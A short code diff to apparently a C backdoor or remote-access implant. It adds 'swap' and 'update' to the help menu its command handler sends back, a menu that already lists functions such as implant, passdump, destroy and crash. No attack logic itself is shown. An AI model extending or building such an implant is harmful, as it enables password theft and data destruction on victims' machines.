@@ -358,7 +358,7 @@ int check_msg(char *msg) {
         return(2);
     }
     else if(strcmp(msg, "help")==0) {
-        char help[200]="available functions:\nimplant\nupload\ndownload\ndestroy\npanic\npyinstall\npassdump\ncrash\nexit\nhelp\n";
+        char help[200]="available functions:\nimplant\nupload\ndownload\ndestroy\npanic\npyinstall\npassdump\ncrash\nswap\nupdate\nexit\nhelp\n";
         _send(help);
         return(1);
     }
